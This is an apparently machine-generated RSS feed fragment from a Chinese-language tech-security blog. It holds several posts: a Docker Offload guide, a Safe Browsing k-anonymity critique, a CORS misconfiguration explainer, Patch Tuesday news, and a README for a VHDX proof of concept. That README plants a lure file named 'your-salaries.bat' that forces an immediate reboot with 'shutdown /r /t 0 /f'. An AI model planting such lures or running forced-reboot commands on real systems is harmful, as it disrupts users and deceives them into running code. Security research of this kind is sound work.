class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3000&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;docker-offload&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-demo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;访问&lt;code&gt;http://localhost:3000&lt;/code&gt;可查看应用，页面会显示使用的GPU型号（如NVIDIA L4）和资源统计。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;停止docker-offload&#34;&gt;停止Docker Offload
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;通过Docker Desktop&lt;/strong&gt;：切换顶部按钮。&lt;br&gt;
&lt;strong&gt;通过终端&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;停止后，所有云端资源将被清理，后续命令恢复本地执行。&lt;/p&gt;
&lt;h2 id=&#34;定价与限制&#34;&gt;定价与限制
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Docker目前提供300分钟免费GPU时长，后续按$0.015/GPU分钟计费。&lt;/li&gt;
&lt;li&gt;详细计费规则参考&lt;a class=&#34;link&#34; href=&#34;https://docs.docker.com/offload/usage/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方文档&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Docker Offload弥合了本地开发便捷性与云端算力之间的鸿沟，尤其适合AI、大数据等高性能场景。开发者无需变更工作流即可获得云端资源，堪称“本地机器的超级计算机大脑”。立即申请Beta体验：&lt;a class=&#34;link&#34; href=&#34;https://docs.docker.com/offload/quickstart/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Docker Offload快速入门&lt;/a&gt;。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>安全浏览协议如何未能保护用户隐私 - k匿名性的缺陷分析</title>
        <link>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E6%B5%8F%E8%A7%88%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E6%9C%AA%E8%83%BD%E4%BF%9D%E6%8A%A4%E7%94%A8%E6%88%B7%E9%9A%90%E7%A7%81-k%E5%8C%BF%E5%90%8D%E6%80%A7%E7%9A%84%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 05:57:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E6%B5%8F%E8%A7%88%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E6%9C%AA%E8%83%BD%E4%BF%9D%E6%8A%A4%E7%94%A8%E6%88%B7%E9%9A%90%E7%A7%81-k%E5%8C%BF%E5%90%8D%E6%80%A7%E7%9A%84%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;安全浏览协议如何未能保护用户隐私---the-trail-of-bits博客&#34;&gt;安全浏览协议如何未能保护用户隐私 - The Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Trail of Bits&lt;/strong&gt;&lt;br&gt;
2019年10月30日&lt;br&gt;
密码学专题&lt;/p&gt;
&lt;p&gt;近期安全研究人员发现，苹果公司将中国用户的所有安全浏览数据发送给腾讯。这一发现使得安全浏览协议底层的安全与隐私保障机制受到严格审视。该协议声称通过所谓的k匿名性(k-anonymity)来保护用户，但本文将展示这种隐私定义在安全浏览场景下实际形同虚设。&lt;/p&gt;
&lt;h2 id=&#34;安全浏览协议工作原理&#34;&gt;安全浏览协议工作原理
&lt;/h2&gt;&lt;p&gt;早期Google通过Lookup API方案，要求用户提交IP地址和待检查URL到谷歌的恶意网站数据库。出于隐私顾虑，现行方案改用Update API（谷歌和腾讯均采用此方案）。&lt;/p&gt;
&lt;p&gt;核心机制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;谷歌维护恶意URL及其256位哈希值的列表&lt;/li&gt;
&lt;li&gt;为节省带宽，仅向浏览器分发32位哈希前缀&lt;/li&gt;
&lt;li&gt;当匹配发生时，浏览器将32位前缀发送给谷歌&lt;/li&gt;
&lt;li&gt;谷歌返回包含该前缀的所有黑名单URL完整哈希&lt;/li&gt;
&lt;li&gt;最终匹配则向用户发出警告&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;什么是k匿名性&#34;&gt;什么是k匿名性
&lt;/h2&gt;&lt;p&gt;k匿名性传统用于数据库去标识化处理，通过数据泛化使得每条记录在特定属性上与至少k-1条其他记录不可区分。在安全浏览场景中，32位哈希前缀理论上可产生约14757次碰撞（Gerbet等人2015年研究数据），即浏览数据具有14757-匿名性。&lt;/p&gt;
&lt;h2 id=&#34;k匿名性为何失效&#34;&gt;k匿名性为何失效
&lt;/h2&gt;&lt;p&gt;尽管满足k匿名性定义，但通过以下技术手段可破解隐私保护：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;跨查询关联攻击&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用cookie和IP地址关联多次查询&lt;/li&gt;
&lt;li&gt;例如连续访问amazon.com及其购物车页面时，可推断用户购物行为&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;URL分解漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协议要求提交URL层级分解（如http://a.b.c/1/2会同时检查）：
&lt;ul&gt;
&lt;li&gt;a.b.c/1/2&lt;/li&gt;
&lt;li&gt;a.b.c/1/&lt;/li&gt;
&lt;li&gt;a.b.c/&lt;/li&gt;
&lt;li&gt;b.c/&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;同时提交多个关联前缀会极大降低匿名性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Gerbet等人研究表明，该漏洞甚至可识别用户的色情内容浏览偏好。更严重的是，由于恶意数据库不公开，无法验证是否被人为植入追踪性哈希前缀。&lt;/p&gt;
&lt;h2 id=&#34;未来展望&#34;&gt;未来展望
&lt;/h2&gt;&lt;p&gt;安全浏览协议虽提供安全价值，但无法有效防范企业或政府监控。k匿名性和差分隐私等技术并非放之四海皆准的方案，理论满足隐私定义的系统在实际部署中可能完全失效。&lt;/p&gt;
&lt;p&gt;如需在应用中实施差分隐私或k匿名性等技术，我们的密码学服务团队可协助处理这些系统固有的复杂性——无论是协议设计还是现有代码审计，都能帮助构建值得用户信任的系统。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Stack Exchange知识库全面开放（现已在Snowflake Marketplace上线）</title>
        <link>http://localhost:1313/p/stack-exchange%E7%9F%A5%E8%AF%86%E5%BA%93%E5%85%A8%E9%9D%A2%E5%BC%80%E6%94%BE%E7%8E%B0%E5%B7%B2%E5%9C%A8snowflake-marketplace%E4%B8%8A%E7%BA%BF/</link>
        <pubDate>Mon, 04 Aug 2025 05:41:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/stack-exchange%E7%9F%A5%E8%AF%86%E5%BA%93%E5%85%A8%E9%9D%A2%E5%BC%80%E6%94%BE%E7%8E%B0%E5%B7%B2%E5%9C%A8snowflake-marketplace%E4%B8%8A%E7%BA%BF/</guid>
        <description>&lt;h3 id=&#34;高质量数据赋能ai生态&#34;&gt;高质量数据赋能AI生态
&lt;/h3&gt;&lt;p&gt;Snowflake客户现可便捷获取Stack Overflow及Stack Exchange网络中最受信赖的技术问答数据，这些经专家验证的内容将提升AI应用和智能代理系统的准确性。在生成式AI爆发时代，优质训练数据成为关键——&amp;ldquo;垃圾进，垃圾出&amp;quot;的行业困境使得结构化知识库价值凸显。&lt;/p&gt;
&lt;h3 id=&#34;知识解决方案的技术架构&#34;&gt;知识解决方案的技术架构
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;数据构成&lt;/strong&gt;：包含stackoverflow.com及约150个垂直社区的问题/答案/评论/标签/投票等核心元素&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;质量信号&lt;/strong&gt;：通过专家验证机制和元数据体系构建质量评估维度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;技术集成&lt;/strong&gt;：支持作为Snowflake Cortex知识扩展，在可扩展平台上实现自然语言查询&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;溯源机制&lt;/strong&gt;：严格遵循内容创作者署名要求的技术实现方案&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;平台协同效应&#34;&gt;平台协同效应
&lt;/h3&gt;&lt;p&gt;Stack Overflow数据科学总监Michael Foree指出：&amp;ldquo;Snowflake平台的数据处理能力让全球专家能更高效利用我们的知识资产&amp;rdquo;。此次合作使技术问答数据能够：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;增强Snowflake Intelligence等代理系统的事实准确性&lt;/li&gt;
&lt;li&gt;覆盖从Ubuntu系统到烹饪技巧的多领域知识&lt;/li&gt;
&lt;li&gt;通过结构化数据提升生成式AI的可靠性&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;社区价值闭环&#34;&gt;社区价值闭环
&lt;/h3&gt;&lt;p&gt;CEO Prashanth Chandrasekar强调：&amp;ldquo;当用户冒险采用AI工具时，他们需要可验证的真实答案&amp;rdquo;。技术实现上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;采用链接溯源和引用机制确保答案可信度&lt;/li&gt;
&lt;li&gt;通过数据授权模式反哺内容创作者社区&lt;/li&gt;
&lt;li&gt;与Moveworks等企业的API集成已验证技术可行性&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这项合作标志着专业社区知识正式成为AI基础设施的关键组件，其技术价值体现在数据清洗、知识结构化及质量评估体系的标准化输出能力。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CORS安全漏洞解析：跨域资源共享的风险与防护</title>
        <link>http://localhost:1313/p/cors%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E7%9A%84%E9%A3%8E%E9%99%A9%E4%B8%8E%E9%98%B2%E6%8A%A4/</link>
        <pubDate>Mon, 04 Aug 2025 05:30:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cors%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E7%9A%84%E9%A3%8E%E9%99%A9%E4%B8%8E%E9%98%B2%E6%8A%A4/</guid>
        <description>&lt;h1 id=&#34;cors-lite&#34;&gt;CORS Lite
&lt;/h1&gt;&lt;p&gt;跨域资源共享(CORS)机制非常复杂，这种复杂性导致了许多可能隐藏安全漏洞的地方。本文将为您提供CORS的&amp;quot;精简版&amp;quot;概述，重点关注我们在测试中最常见的安全漏洞。本文并非完整的CORS入门指南——如果您想深入了解，文末的资源部分会帮助您入门。&lt;/p&gt;
&lt;h2 id=&#34;cors基础与安全风险&#34;&gt;CORS基础与安全风险
&lt;/h2&gt;&lt;p&gt;CORS规范最基本的部分是&amp;quot;Access-Control-Allow-Origin&amp;quot;头部，这是整个机制的基础。该头部告知浏览器允许哪些源访问特定资源。举例来说，如果您的web应用中的JavaScript(从app.example.com加载)向api.example.com发出请求，这个跨域请求默认会被拒绝(即浏览器不会发出请求或会忽略请求结果)，除非api.example.com返回&amp;quot;Access-Control-Allow-Origin&amp;quot;头部告诉浏览器这是允许的。&lt;/p&gt;
&lt;p&gt;对于API而言，Access-Control-Allow-Origin头部经常被设置为&amp;quot;*&amp;quot;，这允许任何域向该API发起跨域请求。这意味着任何地方的任何JavaScript都可以访问您的API。不过幸运的是，即使有Access-Control-Allow-Origin头部，跨域请求也不会传输cookie或其他认证材料，因此这个头部本身实际上是相当安全的。&lt;/p&gt;
&lt;h2 id=&#34;危险组合凭证允许头部&#34;&gt;危险组合：凭证允许头部
&lt;/h2&gt;&lt;p&gt;真正的风险来自另一个CORS头部：Access-Control-Allow-Credentials。当返回这个头部时，跨域请求可以包含cookie和其他认证材料。这才是问题真正开始的地方。如果用户访问example.com，并且example.com在其浏览器中设置了cookie(比如登录后)，Access-Control-Allow-Credentials头部将允许该cookie被来自其他域的请求发送。这意味着这些域可以使用example.com设置的cookie来在example.com上执行操作，无论谁控制着这些域上运行的JavaScript！&lt;/p&gt;
&lt;p&gt;如果对example.com的请求返回Access-Control-Allow-Origin: foo.bar头部和Access-Control-Allow-Credentials: true头部，那么foo.bar上的任何脚本都将拥有与example.com原生脚本相同的权限。这意味着foo.bar上的XSS漏洞等同于example.com上的XSS漏洞！如果您是example.com的所有者，这是对另一个站点所有者的极大信任，在这样做之前应该非常谨慎地考虑。&lt;/p&gt;
&lt;h2 id=&#34;安全防护机制与绕过风险&#34;&gt;安全防护机制与绕过风险
&lt;/h2&gt;&lt;p&gt;由于Access-Control-Allow-Credentials头部非常危险，有一些保护措施可以防止意外使用它。首先，它不能与Access-Control-Allow-Origin: *组合使用。有些站点通过简单地将请求中的Origin头部反射回响应中的Access-Control-Allow-Origin头部来绕过这个限制。如果您考虑这样做，请务必仔细考虑您承担的风险。&lt;/p&gt;
&lt;p&gt;另一个对Access-Control-Allow-Credentials头部的限制是在客户端——XMLHttpRequest必须特意设置&amp;quot;withCredentials&amp;quot;标志才能请求发送凭证，以确保您确实希望浏览器随跨域请求发送cookie和其他敏感材料。&lt;/p&gt;
&lt;h2 id=&#34;关键安全结论&#34;&gt;关键安全结论
&lt;/h2&gt;&lt;p&gt;最重要的结论是：如果您将Origin头部反射到Access-Control-Allow-Origin头部中，并同时设置Access-Control-Allow-Credentials: true，那么任何能够在用户浏览器中执行恶意JavaScript的攻击者(无论该JavaScript位于何处)都可以劫持该用户在您应用中设置的cookie，并以该用户的身份进行操作。&lt;/p&gt;
&lt;p&gt;有些应用尝试折中方案，手动验证origin头部而不是简单地反射它——例如，任何匹配&amp;quot;*.example.com&amp;quot;的来源都被认为是&amp;quot;安全的&amp;quot;，并会返回到Access-Control-Allow-Origin头部中。但这里存在问题：攻击者可以诱使用户访问&amp;quot;example.com.malicious.com&amp;quot;(可能通过钓鱼)，因为该站点匹配模式，就可以发起与之前相同的攻击！&lt;/p&gt;
&lt;h2 id=&#34;其他资源&#34;&gt;其他资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;维基百科CORS条目&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MDN CORS文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PortSwigger CORS漏洞利用博客&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;大规模CORS配置错误分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>2025年6月补丁星期二：微软修复67个漏洞，包含1个零日漏洞</title>
        <link>http://localhost:1313/p/2025%E5%B9%B46%E6%9C%88%E8%A1%A5%E4%B8%81%E6%98%9F%E6%9C%9F%E4%BA%8C%E5%BE%AE%E8%BD%AF%E4%BF%AE%E5%A4%8D67%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8C%85%E5%90%AB1%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Mon, 04 Aug 2025 05:08:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2025%E5%B9%B46%E6%9C%88%E8%A1%A5%E4%B8%81%E6%98%9F%E6%9C%9F%E4%BA%8C%E5%BE%AE%E8%BD%AF%E4%BF%AE%E5%A4%8D67%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8C%85%E5%90%AB1%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;p&gt;微软今日发布安全更新，修复了Windows操作系统及软件中至少67个漏洞。雷德蒙德公司警告称其中一个漏洞已被活跃利用，且本月修复的某个普遍性Windows漏洞的利用蓝图已公开。&lt;/p&gt;
&lt;p&gt;本月唯一的零日漏洞是CVE-2025-33053，这是Windows WebDAV实现中的远程代码执行漏洞。WebDAV作为HTTP扩展协议，允许用户远程管理服务器上的文件和目录。Automox高级安全工程师Seth Hoyt指出，虽然WebDAV在Windows中默认未启用，但在遗留或专用系统中的存在仍使其成为相关攻击目标。&lt;/p&gt;
&lt;p&gt;Rapid7首席软件工程师Adam Barnett表示，微软的漏洞公告未提及Windows WebDAV实现自2023年11月起已被列为弃用状态，这意味着WebClient服务默认不再启动。&amp;ldquo;该漏洞的攻击复杂度被评估为低级别，表明攻击者无需准备目标环境即可利用，仅需用户点击恶意链接。&amp;ldquo;Barnett补充道。&lt;/p&gt;
&lt;p&gt;微软警告称，Windows服务器消息块(SMB)客户端中的权限提升漏洞(CVE-2025-33073)很可能被利用，因为该漏洞的概念验证代码已公开。该漏洞CVSS风险评分为8.8分（满分10分），成功利用可使攻击者获得对受害PC的&amp;quot;SYSTEM&amp;quot;级控制权。Action1联合创始人Alex Vovk强调：&amp;ldquo;最危险的是初始连接后无需进一步用户交互，攻击者通常能在用户无感知的情况下触发漏洞。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;本月修复的漏洞中有10个被微软评为&amp;quot;严重&amp;quot;级别，包含8个远程代码执行漏洞。值得注意的是，本月更新未包含针对Windows Server 2025中&amp;quot;BadSuccessor&amp;quot;漏洞的修复，该漏洞允许攻击者以Active Directory中任意用户权限执行操作。&lt;/p&gt;
&lt;p&gt;Adobe发布了Acrobat Reader等7款产品的更新，修复至少259个漏洞，其中大部分在Experience Manager的更新中。Mozilla Firefox和Google Chrome均发布了需要重启浏览器生效的安全更新，其中Chrome修复了两个零日漏洞(CVE-2025-5419和CVE-2025-4664)。&lt;/p&gt;
&lt;p&gt;建议用户在安装补丁前做好系统备份。如需详细更新清单，可参考SANS互联网风暴中心的补丁星期二汇总报告。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Microsoft虚拟硬盘(VHDX)漏洞利用：远程代码执行(RCE) CVE-2025-49683详解</title>
        <link>http://localhost:1313/p/microsoft%E8%99%9A%E6%8B%9F%E7%A1%AC%E7%9B%98vhdx%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce-cve-2025-49683%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Mon, 04 Aug 2025 04:47:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/microsoft%E8%99%9A%E6%8B%9F%E7%A1%AC%E7%9B%98vhdx%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce-cve-2025-49683%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/04/JGhTH.png" alt="Featured image of post Microsoft虚拟硬盘(VHDX)漏洞利用：远程代码执行(RCE) CVE-2025-49683详解" /&gt;&lt;h1 id=&#34;microsoft-virtual-hard-disk-vhdx-11---远程代码执行rce-cve-2025-49683&#34;&gt;Microsoft Virtual Hard Disk (VHDX) 11 - 远程代码执行(RCE) CVE-2025-49683
&lt;/h1&gt;&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;这个PowerShell脚本(&lt;code&gt;vdh.ps1&lt;/code&gt;)演示了Windows虚拟硬盘(VHDX)处理中的一个&lt;strong&gt;软损坏漏洞&lt;/strong&gt;，涉及&lt;strong&gt;CVE-2025-49683&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;脚本执行以下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个10MB大小的动态VHDX文件(虚拟磁盘)&lt;/li&gt;
&lt;li&gt;将VHDX挂载为系统新驱动器&lt;/li&gt;
&lt;li&gt;初始化、分区并用NTFS格式化虚拟磁盘&lt;/li&gt;
&lt;li&gt;卸载VHDX并在文件8KB偏移处应用&lt;strong&gt;软字节级损坏&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;重新挂载损坏的VHDX观察潜在的文件系统或挂载错误&lt;/li&gt;
&lt;li&gt;列出损坏卷内容以显示影响&lt;/li&gt;
&lt;li&gt;在挂载卷内创建&lt;strong&gt;立即重启批处理脚本(&lt;code&gt;your-salaries.bat&lt;/code&gt;)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;提供卸载和删除损坏VHDX文件的清理选项&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;目的&#34;&gt;目的
&lt;/h2&gt;&lt;p&gt;这个PoC专为&lt;strong&gt;安全研究人员和渗透测试人员&lt;/strong&gt;设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解轻微VHDX文件损坏如何导致系统不稳定或漏洞利用&lt;/li&gt;
&lt;li&gt;演示CVE-2025-49683如何影响VHDX挂载和使用&lt;/li&gt;
&lt;li&gt;帮助开发针对此类虚拟磁盘损坏攻击的检测和缓解策略&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;使用说明&#34;&gt;使用说明
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在提升的PowerShell会话中运行脚本&lt;/strong&gt;(以管理员身份运行 - 已授权的恶意用户)：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vdh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;脚本将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建、挂载并格式化新的VHDX文件&lt;/li&gt;
&lt;li&gt;在字节级别损坏文件&lt;/li&gt;
&lt;li&gt;重新挂载并尝试读取卷&lt;/li&gt;
&lt;li&gt;在挂载驱动器中创建your-salaries.bat批处理文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;要触发立即重启，导航到挂载驱动器(如D:)并运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;your-salaries.bat
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;脚本结束时，按0清理(卸载并删除损坏的VHDX)，或按其他键退出并保留文件供进一步分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;重要警告与注意事项&#34;&gt;重要警告与注意事项
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;仅在测试或隔离环境中运行&lt;/li&gt;
&lt;li&gt;立即重启批处理文件会无警告强制重启系统&lt;/li&gt;
&lt;li&gt;损坏是模拟且微妙的(8KB偏移处)&lt;/li&gt;
&lt;li&gt;影响因操作系统版本和环境而异&lt;/li&gt;
&lt;li&gt;需要管理员权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;损坏偏移：VHDX文件中8192字节(8KB)处&lt;/li&gt;
&lt;li&gt;损坏模式：[0x00, 0xFF, 0x00, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF]字节序列&lt;/li&gt;
&lt;li&gt;磁盘初始化：MBR分区样式，单个NTFS分区&lt;/li&gt;
&lt;li&gt;重启命令：&lt;code&gt;shutdown /r /t 0 /f&lt;/code&gt;强制立即重启&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;示例输出&#34;&gt;示例输出
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vbnet&#34; data-lang=&#34;vbnet&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在检查现有VHDX文件以避免冲突&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
